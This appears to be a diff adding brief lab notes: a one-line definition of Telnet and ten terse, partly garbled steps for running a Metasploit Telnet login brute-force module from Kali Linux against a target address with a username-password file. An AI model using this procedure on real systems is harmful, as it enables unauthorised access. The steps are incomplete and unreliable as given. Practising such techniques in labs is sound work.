@@ -1,0 +1,12 @@
+Telnet is a network protocol that allows users to remotely access and control another computer over the internet or a local area network (LAN) using a text-based command-line interface.
+1.	Open a terminal on Kali Linux
+2.	Put in the ‘msfconsole’ command
+3.	Use the command “telnet 23”  23 is the port number
+4.	Use 1
+5.	Show options
+6.	Set RHOSTS “iP address”
+7.	Set STOP_ON_SUCCESS TRUE
+8.	Set USERPASS_FILE
+9.	Show options
+10.	exploit ( must be successful )
+
